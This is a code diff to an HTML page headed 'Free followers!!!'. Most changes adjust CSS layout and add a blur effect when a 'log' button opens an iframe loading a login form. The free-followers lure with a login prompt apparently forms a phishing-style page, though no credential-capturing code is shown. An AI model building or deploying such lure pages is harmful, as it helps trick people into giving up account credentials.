@@ -8,6 +8,12 @@
     body h1,body h2 {
       text-align: center;
     }
+    h1 {
+      font-size: 10vw;
+    }
+    h2 {
+      font-size: 8vw;
+    }
     .esplica{ 
       z-index: 100;
       position: relative;
@@ -150,7 +156,7 @@
     }
 
     100% {
-      transform: translateY(-115vh) rotate(600deg);
+      transform: translateY(-230vh) rotate(600deg);
     }
   }
 
@@ -160,7 +166,7 @@
     }
 
     100% {
-      transform: translateY(-115vh) rotate(600deg);
+      transform: translateY(-230vh) rotate(600deg);
     }
   }
        #boton3 {
@@ -168,24 +174,31 @@
          position: relative;
          left: 10vw;
          top: 7vh;
+         width: 20vw;
+         font-size: 5vw;
        }
        #boton2 {
-         z-index: 1001;
+         z-index: 100001;
          position: absolute;
-         left: 5vw;
-         top: 70vh;
+         left: 86.5vw;
+         top: 23vh;
          width: 7vw;
          display: none;
          border: 2px solid black;
+         width: 5vw;
+         font-size: 5vw;
        }
        iframe{
          border: 3px solid black;
          width: 80vw;
-         height: 80vh;
+         height: 40vh;
          position: absolute;
          z-index: 10000;
-         left: 8vw;
-         top: 4vh;
+         left: 10vw;
+         top: 20vh;
+         filter: blur(0);
+           box-shadow: 1px -1px 100px 40px lightgray;
+ 
        }
        #obj1 {
          display: none;
@@ -204,14 +217,15 @@
         details summary {
         padding: 1rem; 
         cursor: pointer;
-        list-style: none; }
+        list-style: none;
+        font-size: 7vw;
+        }
         
         details p {
         padding: 1rem;
         margin: 0 1rem 1rem 1rem; 
        background: rgba(246,248,250,0.7);
-        border-left: 2px solid #364f6b; */
-          
+        border-left: 2px solid #364f6b; 
         } 
         details:hover, details[open] {
           box-shadow: 5px 5px 15px #d9d9d9; 
@@ -231,7 +245,7 @@
         content: "👇";
         top: 10px;
         right: 16px;
-        font-size: 7vw;
+        font-size: 4vw;
         } 
         details[open] summary::before {
           -webkit-animation: rotate 0.3s ease-in-out both; 
@@ -249,10 +263,12 @@
             margin-bottom: 2vh;
             font-size: 3vw;
           }
+         
 
     </style>
   </head>
   <body>
+    <div id="boy">
    <h1>
      Free followers!!!
    </h1>
@@ -329,10 +345,10 @@
          .
        </div>
         <button id="boton3" type="button" onclick="ocultar()">log</button>
-
+</div>
     <button id="boton2" type="button" onclick="mostrar()">x</button>
 
-    
+   
     <div id="obj1">
       <iframe src="login.html" frameborder="0" sandbox="allow-forms"></iframe>
     </div>
@@ -340,13 +356,14 @@
         function ocultar(){
 document.getElementById('obj1').style.display = 'block';
 document.getElementById('boton2').style.display = 'block';
-document.getElementById('boton3').style.display = 'none';
+document.getElementById('boy').style.filter = 'blur(4px)';
+
 }
 function mostrar(){
 document.getElementById('obj1').style.display = 'none';
 document.getElementById('boton2').style.display = 'none';
 document.getElementById('boton3').style.display = 'block';
-
+document.getElementById('boy').style.filter = 'blur(0)';
 }
     </script>
        
